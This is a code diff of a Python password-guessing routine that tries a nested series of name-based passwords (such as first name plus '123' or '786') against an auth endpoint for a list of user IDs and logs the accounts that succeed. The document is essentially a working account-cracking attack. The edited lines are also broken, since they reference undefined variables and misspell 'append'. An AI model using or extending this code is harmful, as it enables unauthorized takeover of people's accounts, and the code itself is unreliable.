@@ -472,7 +472,7 @@ def a_s():
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name.lower() + '1122'
+            pass1 = first.lower() 
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
@@ -488,7 +488,7 @@ def a_s():
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + '112' 
+                pass2 = last.lower() 
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -504,7 +504,7 @@ def a_s():
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name.lower() + '786'
+                    pass3 = First.lower() 
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
@@ -520,7 +520,7 @@ def a_s():
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name.lower() + '123'
+                        pass4 = firstlast.lower() 
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
@@ -536,7 +536,7 @@ def a_s():
                             cp.close()
                             cps.apppend(uid + pass4)
                         else:
-                            pass5 = '234567'
+                            pass5 = Firstlast.lower()
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
@@ -552,7 +552,7 @@ def a_s():
                                 cp.close()
                                 cps.apppend(uid + pass5)
                             else:
-                                pass6 = '223344'
+                                pass6 = first.lower() + '123'
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
@@ -568,7 +568,7 @@ def a_s():
                                     cp.close()
                                     cps.apppend(uid + pass6)
                                 else:
-                                    pass7 = '334455'
+                                    pass7 = last.lower() + '123'
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
@@ -584,7 +584,7 @@ def a_s():
                                         cp.close()
                                         cps.apppend(uid + pass7)
                                     else:
-                                        pass8 = '445566'
+                                        pass8 = first.lower() + '12345'
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
@@ -600,7 +600,7 @@ def a_s():
                                             cp.close()
                                             cps.apppend(uid + pass8)
                                         else:
-                                            pass9 = '786786786'
+                                            pass9 = first.lower() + '1234'
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
@@ -616,7 +616,7 @@ def a_s():
                                                 cp.close()
                                                 cps.apppend(uid + pass9)
                                             else:
-                                                pass10 = '786000'
+                                                pass10 = first.lower() + '786'
                                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
